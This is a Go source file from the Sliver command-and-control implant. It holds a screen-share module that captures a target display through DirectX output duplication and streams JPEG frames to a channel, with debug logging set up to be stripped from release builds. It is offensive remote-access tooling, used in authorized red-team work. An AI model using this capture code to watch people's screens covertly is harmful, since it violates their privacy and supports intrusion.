package screen

import (
	"bytes"
	"context"
	"errors"
	"github.com/bishopfox/sliver/implant/sliver/d3d"
	"github.com/kbinani/screenshot"
	"image"
	//{{if .Config.Debug}}
	"log"
	//{{ end }}
	"runtime"
	"sync"
	"time"
)

var ScreenShareData = &ScreenShareStruct{
	m:    sync.Mutex{},
	Data: make(chan []byte),
}

type ScreenShareStruct struct {
	m    sync.Mutex
	Data chan []byte
}

func ScreenShare(ctx context.Context, n int) {
	streamDisplayDXGI(ctx, n)
}

func streamDisplayDXGI(ctx context.Context, n int) {
	var errs []error
	framerate := 10
	max := screenshot.NumActiveDisplays()
	if n >= max {
		//{{if .Config.Debug}}
		log.Printf("Not enough displays\n")
		//{{ end }}
		return
	}
	// Keep this thread, so windows/d3d11/dxgi can use their threadlocal caches, if any
	runtime.LockOSThread()
	// Setup D3D11 stuff
	device, deviceCtx, err := d3d.NewD3D11Device()
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("Could not create D3D11 Device. %v\n", err)
		//{{ end }}
		return
	}
	defer device.Release()
	defer deviceCtx.Release()

	var ddup *d3d.OutputDuplicator
	defer func() {
		if ddup != nil {
			ddup.Release()
			ddup = nil
		}
	}()

	buf := &bufferFlusher{Buffer: bytes.Buffer{}}
	opts := jpegQuality(50)
	limiter := newFrameLimiter(framerate)
	// Create image that can contain the wanted output (desktop)
	finalBounds := screenshot.GetDisplayBounds(n)
	imgBuf := image.NewRGBA(finalBounds)
	lastBounds := finalBounds

	for {
		select {
		case <-ctx.Done():
			return
		default:
			limiter.Wait()
		}
		if len(errs) > 50 {
			return
		}
		bounds := screenshot.GetDisplayBounds(n)
		newBounds := image.Rect(0, 0, int(bounds.Dx()), int(bounds.Dy()))
		if newBounds != lastBounds {
			lastBounds = newBounds
			imgBuf = image.NewRGBA(lastBounds)

			// Throw away old ddup
			if ddup != nil {
				ddup.Release()
				ddup = nil
			}
		}
		// create output duplication if doesn't exist yet (maybe due to resolution change)
		if ddup == nil {
			ddup, err = d3d.NewIDXGIOutputDuplication(device, deviceCtx, uint(n))
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("err: %v\n", err)
				//{{end}}
				errs = append(errs, err)
				continue
			}
		}

		// Grab an image.RGBA from the current output presenter
		err = ddup.GetImage(imgBuf, 0)
		if err != nil {
			if errors.Is(err, d3d.ErrNoImageYet) {
				// don't update
				continue
			}
			//{{if .Config.Debug}}
			log.Printf("Err ddup.GetImage: %v\n", err)
			//{{end}}
			errs = append(errs, err)
			// Retry with new ddup, can occur when changing resolution
			ddup.Release()
			ddup = nil
			continue
		}
		buf.Reset()
		encodeJpeg(buf, imgBuf, opts)
		ScreenShareData.m.Lock()
		ScreenShareData.Data <- buf.Bytes()
		ScreenShareData.m.Unlock()
	}
}

// Workaround for jpeg.Encode(), which requires a Flush()
// method to not call `bufio.NewWriter`
type bufferFlusher struct {
	bytes.Buffer
}

func (*bufferFlusher) Flush() error { return nil }

// finer granularity for sleeping
type frameLimiter struct {
	DesiredFps  int
	frameTimeNs int64

	LastFrameTime     time.Time
	LastSleepDuration time.Duration

	DidSleep bool
	DidSpin  bool
}

func newFrameLimiter(desiredFps int) *frameLimiter {
	return &frameLimiter{
		DesiredFps:    desiredFps,
		frameTimeNs:   (time.Second / time.Duration(desiredFps)).Nanoseconds(),
		LastFrameTime: time.Now(),
	}
}

func (l *frameLimiter) Wait() {
	l.DidSleep = false
	l.DidSpin = false

	now := time.Now()
	spinWaitUntil := now

	sleepTime := l.frameTimeNs - now.Sub(l.LastFrameTime).Nanoseconds()

	if sleepTime > int64(1*time.Millisecond) {
		if sleepTime < int64(30*time.Millisecond) {
			l.LastSleepDuration = time.Duration(sleepTime / 8)
		} else {
			l.LastSleepDuration = time.Duration(sleepTime / 4 * 3)
		}
		time.Sleep(time.Duration(l.LastSleepDuration))
		l.DidSleep = true

		newNow := time.Now()
		spinWaitUntil = newNow.Add(time.Duration(sleepTime) - newNow.Sub(now))
		now = newNow

		for spinWaitUntil.After(now) {
			now = time.Now()
			// SPIN WAIT
			l.DidSpin = true
		}
	} else {
		l.LastSleepDuration = 0
		spinWaitUntil = now.Add(time.Duration(sleepTime))
		for spinWaitUntil.After(now) {
			now = time.Now()
			// SPIN WAIT
			l.DidSpin = true
		}
	}
	l.LastFrameTime = time.Now()
}
